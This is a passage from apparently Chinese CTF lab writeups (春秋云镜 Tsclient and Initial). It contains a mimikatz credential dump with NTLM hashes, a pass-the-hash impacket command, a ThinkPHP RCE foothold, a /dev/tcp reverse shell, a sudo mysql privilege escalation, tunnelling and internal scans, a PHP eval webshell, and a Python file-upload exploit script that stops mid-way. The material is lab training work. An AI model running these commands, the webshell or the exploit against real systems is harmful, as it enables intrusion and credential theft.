24px"><span class="ne-text">kerberos :</span></p><p id="u2af39a4f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : (null)</span></p><p id="u09189972" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : (null)</span></p><p id="u047476dd" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="u59499368" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="u2a3af67f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="u320415bd" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="u98c8ff50" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 54440 (00000000:0000d4a8)</span></p><p id="u8fdbdb6b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : Interactive from 1</span></p><p id="u8a55fbcb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : DWM-1</span></p><p id="uc4141d5c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : Window Manager</span></p><p id="u2f59d054" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u883120da" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:44</span></p><p id="u3e417595" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-90-0-1</span></p><p id="u49c2bc04" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="u66f86364" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> [00000003] Primary</span></p><p id="u3ba66ecb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="uf6a39283" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="u8b425736" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * NTLM     : 83c84a7d3f40516a50f56172f622c38e</span></p><p id="u386b4741" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * SHA1     : ac968d62fbbac3b04a453f87d261345268fc6566</span></p><p id="ucbbbdad5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="u4df2381f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="u71e935c9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="ua350c112" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="u172c34ca" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="u48a28049" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">kerberos :</span></p><p id="u7e6ce609" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="u892e00e7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : xiaorang.lab</span></p><p id="u2bcfec0f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : 17 21 e4 11 5b 9c 4a 70 2b 9c be 83 c3 7c b3 13 ba 9a f6 15 5e 31 81 ce ae f0 72 94 c3 39 b6 3c 31 34 46 02 34 d0 1a 76 7d bf 40 e5 85 ff 7d 41 b7 9c f3 e4 a2 43 31 a4 64 4b 78 34 08 3a f0 ba 35 c2 57 ea 9e 85 7b d9 dc 15 9c 7a df c1 e3 e9 1d 42 42 04 90 1a 25 96 86 e1 c3 8f b5 46 92 ff 57 cd 3f 40 76 25 fe de b3 f0 4e de d0 34 d6 01 2f 4d 02 50 8a cc da c3 63 7c 6d ab 88 ff 92 59 5e 48 b8 d2 99 3b cd 84 04 47 26 62 c4 99 b8 32 61 aa cf d6 63 7e d6 07 8d ed 31 d4 54 71 24 56 96 ff 7f 86 8f 1e 31 17 5b e3 30 bb 0f ca 61 ff a3 b8 cb 4e 55 9a a9 90 79 2b 6e 2e 77 79 ce f6 ed c7 1a 92 80 ca ae 92 4c 85 e7 9d 78 a4 b1 6a 43 42 34 2f fd 15 dc ac 7f 8b 9f ef 7a ab 77 2e e6 a3 be 70 f3 84 23 be 5c 80 fa 4b 27 80 c3 a5 </span></p><p id="ue2a58b98" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="u67f7269c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="u390b9ec2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="uacfd00b7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 25509 (00000000:000063a5)</span></p><p id="u9a46768b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : UndefinedLogonType from 0</span></p><p id="ud2610740" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : (null)</span></p><p id="u020b2d69" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : (null)</span></p><p id="u3b66540c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u0d61ac78" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:43</span></p><p id="u7db41428" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : </span></p><p id="uacff7467" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="u67e21e68" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> [00000003] Primary</span></p><p id="u21731075" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="u7a931f61" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="uc8f0a88a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * NTLM     : 83c84a7d3f40516a50f56172f622c38e</span></p><p id="ud70206cb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * SHA1     : ac968d62fbbac3b04a453f87d261345268fc6566</span></p><p id="ufef36316" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="u75e1ea04" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="u10c4fc1f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">kerberos :</span></p><p id="u6fb51203" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="ub308e326" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="udd02d8ef" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="udd2c4f41" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 999 (00000000:000003e7)</span></p><p id="uedeb269e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : UndefinedLogonType from 0</span></p><p id="uf1dca283" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : WIN2016$</span></p><p id="u4993ef1a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : XIAORANG</span></p><p id="u254e634c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="ufdbbe5d8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:43</span></p><p id="ub9ac06f1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-18</span></p><p id="ue7aa0304" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">msv :</span></p><p id="u1d69f7ff" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">tspkg :</span></p><p id="u61ebe5f9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">wdigest :</span></p><p id="u55ae4999" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : WIN2016$</span></p><p id="u88532a46" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG</span></p><p id="uac80b54f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : (null)</span></p><p id="u68e524b3" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">kerberos :</span></p><p id="u38010651" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Username : win2016$</span></p><p id="ua383fb2f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Domain   : XIAORANG.LAB</span></p><p id="ub887b856" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"> * Password : 17 21 e4 11 5b 9c 4a 70 2b 9c be 83 c3 7c b3 13 ba 9a f6 15 5e 31 81 ce ae f0 72 94 c3 39 b6 3c 31 34 46 02 34 d0 1a 76 7d bf 40 e5 85 ff 7d 41 b7 9c f3 e4 a2 43 31 a4 64 4b 78 34 08 3a f0 ba 35 c2 57 ea 9e 85 7b d9 dc 15 9c 7a df c1 e3 e9 1d 42 42 04 90 1a 25 96 86 e1 c3 8f b5 46 92 ff 57 cd 3f 40 76 25 fe de b3 f0 4e de d0 34 d6 01 2f 4d 02 50 8a cc da c3 63 7c 6d ab 88 ff 92 59 5e 48 b8 d2 99 3b cd 84 04 47 26 62 c4 99 b8 32 61 aa cf d6 63 7e d6 07 8d ed 31 d4 54 71 24 56 96 ff 7f 86 8f 1e 31 17 5b e3 30 bb 0f ca 61 ff a3 b8 cb 4e 55 9a a9 90 79 2b 6e 2e 77 79 ce f6 ed c7 1a 92 80 ca ae 92 4c 85 e7 9d 78 a4 b1 6a 43 42 34 2f fd 15 dc ac 7f 8b 9f ef 7a ab 77 2e e6 a3 be 70 f3 84 23 be 5c 80 fa 4b 27 80 c3 a5 </span></p><p id="u7a6cd2da" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">ssp :</span></p><p id="ub086ea6a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">credman :</span></p><p id="u530321b4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p></details><p>hash传递攻击。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk</span><br></pre></td></tr></table></figure><p>拿到shell之后直接获取flag3。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141030590.png" alt="img"></p><p>flag3为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;11216481-4474-44ea-9841-d252f2e7f883&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h2><p><a href="https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/#flag02">https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/</a></p><p><a href="https://zer0peach.github.io/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/">https://zer0peach.github.io/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/</a></p><p><a href="https://bowuchuling.github.io/posts/chunqiu_Tsclient">https://bowuchuling.github.io/posts/chunqiu_Tsclient</a></p><p><a href="https://www.cnblogs.com/fdxsec/p/17875312.html">https://www.cnblogs.com/fdxsec/p/17875312.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Initial</title>
      <link href="/2024/12/02/Initial/"/>
      <url>/2024/12/02/Initial/</url>
      
        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>目标靶机ip为：39.101.163.148  </p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>对目标靶机进行端口扫描，我这里采用kali的masscan对ip进行全端口扫描。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p 0-65535 39.101.163.148 --rate=1000</span><br></pre></td></tr></table></figure><p>这玩意扫太快了，好像不怎么准，老老实实用nmap或者其他工具吧。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140939874.png" alt="img"></p><p>访问web端口，很明显的ThinkPHP的标志。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140940248.png" alt="img"></p><p>进行目录扫描，好像没什么东西。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140940410.png" alt="img"></p><p>找不到版本号，尝试用fscan进行扫描，或者直接用ThinkPHP工具尝试梭哈。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140940676.png" alt="img"></p><p>扫描到tp 5.0.23 rce的漏洞。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140941235.png" alt="img"></p><p>直接用工具去getshell，蚁剑连接即可。也可以手动去拿payload去打。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140941740.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140942574.png" alt="img"></p><p>蚁剑成功连接。尝试反弹shell。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ip/7777 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140942429.png" alt="img"></p><p>尝试提权，先试试suid。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140942078.png" alt="img"></p><p>可以看到这里的mysql可以sudo无密码使用，我们上网站查看利用手法。</p><p><a href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! /bin/bash&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140948459.png" alt="img"></p><p>成功提权，记得前面是开过ssh端口，我们可以尝试把root密码进行修改，然后ssh进行连接。使用 passwd root进行修改。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140948895.png" alt="img"></p><p>然后尝试ssh连接。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140948104.png" alt="img"></p><p>好像有公私钥，我们还是直接用吧。</p><p>在&#x2F;root&#x2F;flag目录下面有一个flag01.txt，我们可以读到。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140948011.png" alt="img"></p><p>第一段flag为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;60b53231-</span><br></pre></td></tr></table></figure><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>先搭建隧道，我直接用stowaway。</p><p>vps：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin -l 8888 -s 123</span><br></pre></td></tr></table></figure><p>靶机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent -c ip:8888 -s 123</span><br></pre></td></tr></table></figure><p>选择节点，配置socks5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line"></span><br><span class="line">socks 1234</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140948100.png" alt="img"></p><p>接着配置kali和网页的代理为vps+port就行了。</p><p>我们再来查看一下所处网段。</p><p>ip a 或者 ifconfig</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140948191.png" alt="img"></p><p>我们先尝试挂完代理访问内网的ip。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140948952.png" alt="img"></p><p>能访问代表成功挂上。我们再进行内网信息收集，先上个fscan，用蚁剑就行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.1.0/24（-np）&gt;&gt; 1.txt</span><br></pre></td></tr></table></figure><p><strong>跳过存活探测（-np）</strong>：<code>-np</code> 参数用于跳过对目标主机的存活探测，即不进行 ICMP 或 TCP 连接尝试来判断主机是否在线。这可以减少扫描过程中的网络流量和潜在的检测风险  </p><p>这个没有回显，我们保存到文件查看。</p><details class="lake-collapse"><summary id="u84752955"><span class="ne-text">1.txt</span></summary><p id="u5b1a26d7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">start infoscan</span></p><p id="u7dc4b8a1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">trying RunIcmp2</span></p><p id="ua9939993" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">The current user permissions unable to send icmp packets</span></p><p id="u63f87a32" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">start ping</span></p><p id="u74ed0436" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">(icmp) Target 172.22.1.2      is alive</span></p><p id="ub46a68c2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">(icmp) Target 172.22.1.21     is alive</span></p><p id="u4bc8abb0" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">(icmp) Target 172.22.1.18     is alive</span></p><p id="u03ff7646" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">(icmp) Target 172.22.1.15     is alive</span></p><p id="u97f2c706" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] Icmp alive hosts len is: 4</span></p><p id="u7b25797e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:3306 open</span></p><p id="u637fc3a8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:445 open</span></p><p id="u30a7a909" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.21:445 open</span></p><p id="u3e61c488" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.2:445 open</span></p><p id="u12a1ca5d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:80 open</span></p><p id="u409a7a2b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.15:80 open</span></p><p id="u084abd94" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:139 open</span></p><p id="u4ce18599" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.21:139 open</span></p><p id="ue104177a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.2:139 open</span></p><p id="ua97e9b87" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.15:22 open</span></p><p id="uac9d14b8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.18:135 open</span></p><p id="u6e831a1d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.21:135 open</span></p><p id="u4e2f1005" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.2:135 open</span></p><p id="uc6c06b4b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.15:10001 open</span></p><p id="u57be1799" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">172.22.1.2:88 open</span></p><p id="u9c7ffac4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] alive ports len is: 15</span></p><p id="u2a4e47ec" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">start vulscan</span></p><p id="u71a07617" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetInfo </span></p><p id="u1907e843" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*]172.22.1.18</span></p><p id="ued6667e1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]XIAORANG-OA01</span></p><p id="u8d2bb32b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]172.22.1.18</span></p><p id="u570bce29" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetInfo </span></p><p id="ucd3b9a16" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*]172.22.1.21</span></p><p id="u083b117b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]XIAORANG-WIN7</span></p><p id="u497273f9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]172.22.1.21</span></p><p id="u1f17be4f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetInfo </span></p><p id="u4600679c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*]172.22.1.2</span></p><p id="ud08737e8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]DC01</span></p><p id="u52f44992" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">   [-&gt;]172.22.1.2</span></p><p id="uf55ed2c5" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)</span></p><p id="u9ee9a749" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span></p><p id="u049e7578" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span></p><p id="u2a8d62b2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span></p><p id="uda812edc" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] WebTitle </span><span class="ne-text">http://172.22.1.15</span><span class="ne-text">        code:200 len:5578   title:Bootstrap Material Admin</span></p><p id="u2ed2a24b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] WebTitle </span><span class="ne-text">http://172.22.1.18</span><span class="ne-text">        code:302 len:0      title:None 跳转url: </span><span class="ne-text">http://172.22.1.18?m=login</span></p><p id="u22a9082f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span></p><p id="ub2ccf27d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] WebTitle </span><span class="ne-text">http://172.22.1.18?m=login</span><span class="ne-text"> code:200 len:4012   title:信呼协同办公系统</span></p><p id="u1ef7be89" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[+] PocScan </span><span class="ne-text">http://172.22.1.15</span><span class="ne-text"> poc-yaml-thinkphp5023-method-rce poc1</span></p><p id="u3c7997ff" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">已完成 15/15</span></p><p id="u2224f65d" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">[*] 扫描结束,耗时: 11.07034237s</span></p></details><p>直接ai分析吧，懒得看了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140948885.png" alt="img"></p><p>有四个存活主机，这里15是我们已经拿下了的主机，然后在18上面有一个办公系统，2为DC域控，21存在永恒之蓝漏洞，看样子是域成员。</p><p>然后ai分析的NetBios信息如下。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140948519.png" alt="img"></p><p>我们先尝试打办公系统（172.22.1.18），再从另一台的永恒之蓝（172.22.1.21）入手。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140949558.png" alt="img"></p><p>访问之后可以看到对应的版本号2.2.8。</p><p>弱口令 <strong>admin:admin123</strong>，在poc库里面可以找到一个任意文件上传漏洞。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503140949142.png" alt="img"></p><p>在里面直接给出了python的poc脚本。</p><p>我们首先需要在poc.py同级目录下面创建一个1.php文件，上马就行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php为webshell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要修改以下内容：</span></span><br><span class="line"><span class="comment"># url_pre = &#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,</span></span><br><span class="line"><span class="comment"># &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"><span class="comment"># url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span 